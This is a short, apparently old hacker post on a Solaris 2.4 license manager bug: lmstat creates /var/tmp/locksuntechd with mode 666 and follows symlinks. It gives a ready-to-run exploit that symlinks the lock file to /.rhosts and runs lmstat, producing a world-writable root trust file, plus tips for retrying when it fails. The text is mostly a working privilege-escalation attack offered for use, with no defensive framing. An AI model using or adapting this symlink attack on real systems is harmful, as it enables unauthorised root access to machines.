Another bug for solaris 2.4
The license manager must be running, expect both
lmgrd.ste & suntechd to be somewhere in your process table.

/var/tmp/locksuntechd will be created by anyone who runs
lmstat, with perms 666 and quite happy to follow symlinks.
Anyway, here's the exploit.

-+-+-+ CUT
rm /var/tmp/locksuntechd
ln -s /.rhosts /var/tmp/locksuntechd
lmstat -c <insert your license file name here>

NOTES
lmstat could be anywhere on your filesystem. try /etc/opt/licenses
I found that sometimes this didn't work first time. It didn't create
the file. Just run lmstat again and it'll work.
